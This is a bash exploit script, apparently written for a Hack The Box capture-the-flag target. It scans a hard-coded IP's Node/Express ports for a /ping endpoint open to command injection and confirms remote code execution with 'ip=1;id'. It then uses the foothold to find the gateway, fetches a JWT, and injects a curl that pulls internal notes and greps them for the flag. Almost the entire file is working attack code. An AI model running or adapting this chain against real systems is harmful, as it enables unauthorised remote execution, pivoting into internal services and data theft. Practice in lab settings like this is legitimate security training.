#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
API_PORT=${3:-41412}
TO=${4:-8}
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
mkdir -p "$OUT_DIR" "$TMP_DIR"
# 1) Build candidate Node/Express ports
NODE_PORTS=$(grep -E "^[0-9]+/tcp\s+open\s+http\s+Node\.js Express framework" "$NMAP_FILE" | cut -d/ -f1 | tr '\n' ' ')
NODE_PORTS="$NODE_PORTS 52548 41417 46132 48544 48656 50692 54991 57280 57759"
echo "$NODE_PORTS" | tr ' ' '\n' | sort -n | uniq > "$TMP_DIR/node_ports_scan.txt"
# 2) Find working /ping with command injection
RCE_PORT=""
while read -r p; do
  [[ -z "$p" ]] && continue
  RES=$(/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;id' 'http://$IP:$p/ping' || true")
  if echo "$RES" | grep -qiE "uid=|www-data|linux"; then RCE_PORT=$p; echo "RCE:$p" | tee "$OUT_DIR/rce_found3.txt"; break; fi
  sleep 0.1
done < "$TMP_DIR/node_ports_scan.txt"
if [[ -z ${RCE_PORT:-} ]]; then
  # try 52548 explicitly
  p=52548
  RES=$(/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;id' 'http://$IP:$p/ping' || true")
  if echo "$RES" | grep -qiE "uid=|www-data|linux"; then RCE_PORT=$p; echo "RCE:$p" | tee "$OUT_DIR/rce_found3.txt"; fi
fi
[[ -z ${RCE_PORT:-} ]] && { echo "No RCE ping found" | tee "$OUT_DIR/rce_found3.txt"; exit 0; }
RCE_BASE="http://$IP:$RCE_PORT/ping"
# 3) Determine host gateway from inside target via RCE
GW=$(/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;ip route | awk \''/default/ {print $3; exit}\'' ' '$RCE_BASE" | tr -d '\r' | head -n1 || true)
if [[ -z ${GW:-} ]]; then GW=127.0.0.1; fi
# 4) Fresh JWT token from external API
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' -d '{"email":"a@a.com","password":"a"}' "http://$IP:$API_PORT/api/auth/login" > "$OUT_DIR/login_resp.json"
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
# 5) Build safe injection file with Python
python3 - <<'PY'
import json
from pathlib import Path
from urllib.parse import urlencode
TOK=Path('/workspace/recon/httpx/login_resp.json').read_text()
import json as J
TOK=J.loads(TOK)['token']
GW=Path('/workspace/recon/httpx/gateway.txt').read_text().strip() if Path('/workspace/recon/httpx/gateway.txt').exists() else '127.0.0.1'
cmd=f"ip=1;curl -s -H 'Authorization: Bearer {TOK}' http://{GW}:41412/api/notes/all"
Path('/workspace/recon/tmp/inj_all3.txt').write_text(cmd)
print(cmd)
PY
# Save gateway
printf "%s" "$GW" > "$OUT_DIR/gateway.txt"
# 6) Execute injection
/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'/workspace/recon/tmp/inj_all3.txt' '$RCE_BASE'" > "$OUT_DIR/localhost_notes_all3.json" || true
# 7) Grep for HTB flag
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR/localhost_notes_all3.json" | tee "$OUT_DIR/hits_all3.txt" || true
